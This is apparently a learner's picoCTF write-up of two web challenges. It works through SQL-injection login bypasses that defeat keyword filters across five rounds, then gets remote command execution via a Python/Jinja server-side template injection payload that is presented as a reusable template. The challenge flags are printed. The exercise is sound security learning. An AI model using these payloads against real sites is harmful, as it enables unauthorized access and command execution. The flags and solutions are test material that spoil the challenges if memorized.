# WEB EXPLOITATION 

# 1. Web Gauntlet 
Can you beat the filters? Login as admin. 

## Solution:
1. There are 2 website links (a login page and a filter page) given in the challenge. On opening one of them, it is a Login bypass question. So, we use SQL injection to find the flag.
2. We use the word 'admin' string as login, bcz in the challenge, we need to login as admin. 
3. The problem is, we are not given any hint about the password for logging in. So, we can only move foward in the challenge, if we skip the password check process. For that we can pass : -- or /*
4. Round1: or , I pass : admin'-- as username, bcz I need to include the 'admin' string + pass the password check. 

5. Round2: or and like = -- , I pass : admin'/* as username. In this round, -- is filtered, but we still need to pass the password check. So, we use /* instead.

6. Round3: or and = like > < -- , I pass : admin'/* as username.

7. Round4: or and = like > < -- admin , I pass : ad'||'min'/* as username, bcz it is mentioned we can't used the admin string directly, but we need to use it indirectly, inorder to pss the filter test.

8. Round5: or and = like > < -- union admin , I pass : ad'||'min'/* as username, same as above, bcz we don't have anything to do with the 'union' string.
9. Now, on passing this I got this screen :
![alt text](Photo-1-1.png)
10. On refreshing the filter page, I got this page : 
![alt text](Photo-2-1.png)
11. And the flag was included as a comment.

## Flag:
```
picoCTF{y0u_m4d3_1t_79a0ddc6}
```

## Concepts Learned:
1. or — logical OR. -> Use it to make a condition always true.
2. -- — start of a single-line comment (in many SQL dialects). Anything after -- is ignored, so you can cut off the rest of the original query (like the password check).

## Notes:
1. I was stuck with the round 2 , like why -- is not being passed, but later on understood that we needed to pass /*, which is an alternate way to pass the filters.
2. Also, I was not expecting the username inputs to repeat, like in round 2 and round 3, which I understood when I read the hint 'Write down the injections you use in case you lose your progress.` Ended up wasting some time here.

## Resources:
-https://portswigger.net/web-security/sql-injection/cheat-sheet : For the string concatenation notes and in general sql injections
-https://github.com/payloadbox/sql-injection-payload-list : Referred some sqli payloads from this 

***

# 2. SSTI1
I made a cool website where you can announce whatever you want! Try it out!

## Solution:
1. From the name of the challenge itself, we are given the hint that, we need to perform a SSTI inorder to solve the challenge.
2. First on entering the website, I just test out the site like : 
![alt text](photo-3-1.png)
which gave the output :
![alt text](photo3.2-1.png)
3. Now, I test what the language is used in the backend. For, that I test python, the obvious one first, by passing {{config}} and it gave the output like this :
![alt text](photo3.3-1.png)
which confirmed that its python itself!!!
4. Then, I pass `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('__').read() }}` function as :
a) {{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }} - to list all the directories in the backend 
![alt text](photo3.4-1.png)
b) Then, I execute the flag directory like : {{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag').read() }}, which reveals the flag
![alt text](photo3.5-1.png)

## Flag:
```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_f5438664}
```
## Concepts Learned:
1. `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('_').read() }} ` function : This is a function to exploit The SSTI. Inorder to do so, we just pass the commands required in the popen('_') part of the function.

## Notes:
1. This was quite a straight-foward challenge, where the only thing is to get the programming language used in the backend right, so that we can then output the backend processes to the frontend as required.

## Resources:
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#exploit-the-ssti-by-calling-ospopenread - Referred this repository to get the os.popen().read() command.


***